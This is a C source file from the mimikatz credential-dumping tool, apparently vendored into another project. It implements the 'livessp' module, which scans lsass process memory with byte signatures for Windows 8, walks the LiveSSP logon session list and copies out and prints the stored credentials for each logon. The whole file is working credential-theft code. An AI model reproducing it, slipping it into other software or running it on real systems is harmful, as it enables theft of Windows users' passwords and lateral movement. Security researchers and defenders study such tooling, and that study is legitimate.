#include "../../../include/mimikatz/inc/globals.h"
#include "../../../include/mimikatz/modules/kull_m_patch.h"
#include "../../../include/mimikatz/sekurlsa/packages/kuhl_m_sekurlsa_livessp.h"
/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
//#include "kuhl_m_sekurlsa_livessp.h"

#ifdef _M_X64
BYTE PTRN_WALL_LiveLocateLogonSession[]	= {0x74, 0x25, 0x8b};
KULL_M_PATCH_GENERIC LiveReferences[] = {
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LiveLocateLogonSession),	PTRN_WALL_LiveLocateLogonSession},	{0, NULL}, {-7}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_LiveLocateLogonSession[]	= {0x8b, 0x16, 0x39, 0x51, 0x24, 0x75, 0x08};
KULL_M_PATCH_GENERIC LiveReferences[] = {
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LiveLocateLogonSession),	PTRN_WALL_LiveLocateLogonSession},	{0, NULL}, {-8}},
};
#endif

PKIWI_LIVESSP_LIST_ENTRY LiveGlobalLogonSessionList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_package = {_CT_("livessp"), kuhl_m_sekurlsa_enum_logon_callback_livessp, FALSE, _CT_("livessp.dll"), {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
/*
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_single_package[] = {&kuhl_m_sekurlsa_livessp_package};

NTSTATUS kuhl_m_sekurlsa_livessp(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_livessp_single_package, 1, NULL, NULL);
}
*/
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PLUID logId, IN PVOID pCredentials, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
{
	KIWI_LIVESSP_LIST_ENTRY credentials;
	KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, cLsass->hLsassMem};
	
	if(kuhl_m_sekurlsa_livessp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(cLsass, &kuhl_m_sekurlsa_livessp_package.Module, LiveReferences, sizeof(LiveReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &LiveGlobalLogonSessionList, NULL, NULL))
	{
		aLsassMemory.address = LiveGlobalLogonSessionList;
		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), logId))
		{
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_LIVESSP_LIST_ENTRY)))
			{
				if(aLsassMemory.address = credentials.suppCreds)
				{
					aLocalMemory.address = &primaryCredential;
					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL)))
						kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, logId, (cLsass->osContext.BuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT, externalCallback, externalCallbackData);
				}
			}
		}
	} else kprintf(L"KO");
}

